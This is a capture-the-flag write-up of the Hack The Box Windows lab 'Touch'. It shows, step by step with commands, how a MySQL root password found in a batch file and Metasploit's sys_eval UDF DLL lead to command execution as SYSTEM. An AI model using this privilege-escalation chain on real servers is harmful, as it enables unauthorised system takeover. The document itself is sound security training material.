# HTB Touch --- Windows Machine Writeup

![HTB Touch](../images/touch.png)

> **Platform:** Hack The Box\
> **Machine:** Touch\
> **OS:** Windows\
> **Difficulty:** Windows / Privilege Escalation\
> **Pwned:** 04 October 2026\
> **Author:** Jaisurya

------------------------------------------------------------------------

## Overview

This is my detailed walkthrough for **Hack The Box --- Touch**,
documenting the path I used to obtain code execution as
`NT AUTHORITY\SYSTEM` and capture the user flag.

The key part of the machine was identifying that **MySQL was running as
`LocalSystem`**, obtaining the MySQL root credentials from a scheduled
batch file, and then abusing a MySQL User Defined Function (UDF) to
execute operating-system commands.

The final privilege-escalation chain was:

``` text
MySQL credentials
      │
      ▼
MySQL root access over TCP
      │
      ▼
MySQL UDF DLL
      │
      ▼
sys_eval()
      │
      ▼
Windows command execution
      │
      ▼
NT AUTHORITY\SYSTEM
      │
      ▼
Read protected files / capture flags
```

------------------------------------------------------------------------

# 1. Enumeration

The initial enumeration showed that the target was a Windows machine
exposing the usual remote services.

During enumeration, the important service was **MySQL**.

The installed MySQL version was later confirmed as:

``` text
8.0.42
```

The MySQL installation was located at:

``` text
C:\MySQL
```

The important directories/files discovered during the process were:

``` text
C:\MySQL\bin\
C:\MySQL\lib\plugin\
C:\ProgramData\HTB Airways\
```

The MySQL service was particularly interesting because it was running
with highly privileged Windows permissions.

------------------------------------------------------------------------

# 2. Identifying the MySQL Service Account

One of the most important observations was that the MySQL Windows
service was running as:

``` text
NT AUTHORITY\SYSTEM
```

This immediately made MySQL a potential privilege-escalation vector.

If arbitrary commands could be executed through the MySQL process, those
commands would inherit the privileges of the MySQL service.

In other words:

``` text
MySQL process
     │
     └── runs as NT AUTHORITY\SYSTEM
                 │
                 ▼
       commands executed by MySQL
                 │
                 ▼
          SYSTEM privileges
```

This was the central idea behind the eventual exploit path.

------------------------------------------------------------------------

# 3. Finding the MySQL Credentials

While inspecting the files under:

``` text
C:\ProgramData\HTB Airways\
```

I found a batch file named:

``` text
refresh-dates.bat
```

The batch file contained the MySQL command used to refresh the database:

``` cmd
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4y$_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul
```

This exposed the MySQL root password:

``` text
HTB@irw4y$_DB!2026
```

This was a major finding.

------------------------------------------------------------------------

# 4. Connecting to MySQL

A normal connection attempt was not sufficient, so I connected
explicitly over TCP using the MySQL installation's full executable path:

``` cmd
C:\MySQL\bin\mysql.exe -h 127.0.0.1 -P 3306 -u root -p"HTB@irw4y$_DB!2026"
```

The connection succeeded.

I then verified the MySQL version:

``` sql
SELECT VERSION();
```

The result was:

``` text
8.0.42
```

At this point I had valid MySQL root access.

------------------------------------------------------------------------

# 5. Investigating MySQL UDF Execution

The next question was:

> Can MySQL execute operating-system commands?

MySQL supports User Defined Functions (UDFs). One useful UDF for this
purpose is `sys_eval`, which can execute a system command and return its
output.

The Metasploit Framework contains a compiled MySQL UDF DLL suitable for
64-bit Windows:

``` text
/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll
```

I copied the DLL to the target's MySQL plugin directory:

``` text
C:\MySQL\lib\plugin\
```

The resulting path was:

``` text
C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
```

The MySQL configuration also showed:

``` text
secure_file_priv = NULL
```

which was relevant when working with MySQL file operations.

------------------------------------------------------------------------

# 6. Registering the UDF

With the DLL available in the MySQL plugin directory, I registered the
function:

``` sql
CREATE FUNCTION sys_eval
RETURNS STRING
SONAME 'lib_mysqludf_sys_64.dll';
```

The function was successfully created.

------------------------------------------------------------------------

# 7. Testing Command Execution

I first tested the command execution functionality with:

``` sql
SELECT sys_eval('whoami');
```

The result initially appeared as hexadecimal data:

``` text
0x6E74617574686F726974795C73797374656D
```

Decoding that value produced:

``` text
ntauthority\system
```

I then used the MySQL client option:

``` text
--binary-as-hex=FALSE
```

to display the returned output directly.

The command:

``` cmd
C:\MySQL\bin\mysql.exe -h 127.0.0.1 -P 3306 -u root -p"HTB@irw4y$_DB!2026" --binary-as-hex=FALSE -e "SELECT sys_eval('whoami');"
```

returned:

``` text
nt authority\system
```

This was the critical proof.

The command was not executing as the low-privileged Kiosk user.

It was executing as:

``` text
NT AUTHORITY\SYSTEM
```

Therefore, the MySQL service provided a direct path to SYSTEM-level
command execution.

------------------------------------------------------------------------

# 8. Verifying Command Output

Before attempting to retrieve flags, I verified that arbitrary command
output worked.

For example:

``` sql
SELECT sys_eval('echo TEST');
```

returned:

``` text
TEST
```

I also tested writing command output to a file:

``` sql
SELECT sys_eval('whoami > C:/ProgramData/out.txt');
```

Then:

``` sql
SELECT sys_eval('type C:/ProgramData/out.txt');
```

returned:

``` text
nt authority\system
```

This confirmed that the UDF was genuinely executing Windows commands
rather than simply returning a misleading MySQL result.

------------------------------------------------------------------------

# 9. Finding the User Flag

The normal desktop belonged to:

``` text
KioskUser
```

The user profile was:

``` text
C:\Users\KioskUser
```

Listing the desktop revealed:

``` text
C:\Users\KioskUser\Desktop

cmd.lnk
user.txt
```

The user flag was therefore located at:

``` text
C:\Users\KioskUser\Desktop\user.txt
```

------------------------------------------------------------------------

# 10. Handling Windows Path Escaping

One annoying part of the process was that commands containing Windows
backslashes did not always behave as expected when passed through:

``` text
SQL → sys_eval() → Windows command interpreter
```

For example, directly passing a Windows path sometimes resulted in:

``` text
NULL
```

Rather than repeatedly fighting the escaping, I constructed the
backslashes inside MySQL using:

``` sql
CHAR(92)
```

ASCII `92` is:

``` text
\
```

So instead of directly writing:

``` text
C:\Users\KioskUser\Desktop\user.txt
```

inside the SQL string, the path could be constructed with:

``` sql
CONCAT(
    'type C:',
    CHAR(92),
    'Users',
    CHAR(92),
    'KioskUser',
    CHAR(92),
    'Desktop',
    CHAR(92),
    'user.txt'
)
```

This produced the correct Windows path without relying on the SQL parser
to handle the backslashes.

------------------------------------------------------------------------

# 11. Reading `user.txt`

The final command used to read the file was:

``` cmd
C:\MySQL\bin\mysql.exe -h 127.0.0.1 -P 3306 -D mysql -u root -p"HTB@irw4y$_DB!2026" --binary-as-hex=FALSE -e "SELECT sys_eval(CONCAT('type C:',CHAR(92),'Users',CHAR(92),'KioskUser',CHAR(92),'Desktop',CHAR(92),'user.txt'));"
```

The result was:

``` text
1cc0aaef238030e73d2e12f41f26b13e
```

That gave me the **user flag**.

------------------------------------------------------------------------

# 12. Why the Exploit Worked

The important security issue was not simply that MySQL had a password.

The complete chain depended on several conditions lining up:

### 1. Credentials were exposed

The database password was present in:

``` text
C:\ProgramData\HTB Airways\refresh-dates.bat
```

### 2. The account had sufficient MySQL privileges

The `root` database account could register the UDF.

### 3. The MySQL plugin directory was writable/usable for the attack

The malicious/utility UDF DLL could be placed in:

``` text
C:\MySQL\lib\plugin\
```

### 4. `sys_eval` provided operating-system command execution

The UDF allowed SQL to invoke Windows commands.

### 5. MySQL was running as SYSTEM

This was the decisive privilege boundary.

Therefore:

``` text
SQL command
   ↓
sys_eval()
   ↓
MySQL process
   ↓
NT AUTHORITY\SYSTEM
   ↓
Windows command
```

------------------------------------------------------------------------

# 13. Important Commands

For reference, the main commands used during the exploitation chain
were:

### Connect to MySQL

``` cmd
C:\MySQL\bin\mysql.exe -h 127.0.0.1 -P 3306 -u root -p"HTB@irw4y$_DB!2026"
```

### Check MySQL version

``` sql
SELECT VERSION();
```

### Register the UDF

``` sql
CREATE FUNCTION sys_eval
RETURNS STRING
SONAME 'lib_mysqludf_sys_64.dll';
```

### Check execution context

``` sql
SELECT sys_eval('whoami');
```

### Test command execution

``` sql
SELECT sys_eval('echo TEST');
```

### Read the user flag

``` sql
SELECT sys_eval(CONCAT('type C:',CHAR(92),'Users',CHAR(92),'KioskUser',CHAR(92),'Desktop',CHAR(92),'user.txt'));
```

------------------------------------------------------------------------

# 14. Lessons Learned

This machine reinforced several useful Windows privilege-escalation
concepts.

## Service accounts matter

When a service is running as:

``` text
NT AUTHORITY\SYSTEM
```

anything that gives an attacker code execution through that service can
potentially become a full SYSTEM compromise.

Always check:

``` text
Who is the service running as?
```

rather than only asking:

``` text
What software is running?
```

------------------------------------------------------------------------

## Credentials in scripts are dangerous

The database password was exposed directly inside a batch file.

Operational scripts often contain:

-   Database passwords
-   API keys
-   Service credentials
-   Backup credentials
-   Administrative commands

Whenever you obtain local file access, searching configuration files and
scripts can be extremely valuable.

------------------------------------------------------------------------

## MySQL UDFs can become an OS command-execution primitive

A database normally should not provide an arbitrary operating-system
command interface.

However, if an attacker can load an appropriate UDF and register
functions such as:

``` text
sys_eval
```

the database process can become an execution bridge into the operating
system.

The privileges are inherited from the process hosting MySQL.

------------------------------------------------------------------------

## Output encoding can hide useful results

Initially, the result of:

``` sql
SELECT sys_eval('whoami');
```

appeared as hexadecimal:

``` text
0x6E74617574686F726974795C73797374656D
```

Using:

``` text
--binary-as-hex=FALSE
```

made the output readable:

``` text
nt authority\system
```

When command output looks strange, always consider whether the client is
encoding binary/string data rather than assuming the command failed.

------------------------------------------------------------------------

# 15. Attack Chain Summary

The entire compromise can be reduced to:

``` text
Windows Enumeration
        │
        ▼
MySQL discovered
        │
        ▼
MySQL service runs as SYSTEM
        │
        ▼
refresh-dates.bat discovered
        │
        ▼
MySQL root password recovered
        │
        ▼
MySQL root login
        │
        ▼
lib_mysqludf_sys_64.dll
        │
        ▼
Create sys_eval()
        │
        ▼
sys_eval('whoami')
        │
        ▼
NT AUTHORITY\SYSTEM
        │
        ▼
Read C:\Users\KioskUser\Desktop\user.txt
        │
        ▼
USER FLAG
```

------------------------------------------------------------------------

# 16. Final Result

**Touch --- PWNED** ✅

``` text
Machine: Touch
Platform: Hack The Box
OS: Windows
Pwn date: 04 October 2026
Machine rank at completion: #913
XP earned: 585
```

The most important takeaway from this machine was the
privilege-escalation chain:

> **Exposed MySQL credentials → MySQL UDF → `sys_eval()` → SYSTEM**

The machine looked like a database-focused attack at first, but the real
impact came from the privileges of the underlying Windows service.

------------------------------------------------------------------------

# Conclusion

Touch was a great demonstration of why privilege escalation is often
about **connecting small findings together** rather than finding one
magical exploit.

The password by itself was only database access.

The UDF by itself was only command execution.

The SYSTEM service account by itself was only a configuration weakness.

But when combined:

``` text
Credential Disclosure
        +
MySQL UDF
        +
SYSTEM Service
        =
SYSTEM Command Execution
```

That combination ultimately gave me the ability to access protected
files and complete the machine.

**Touch pwned. 🟢**
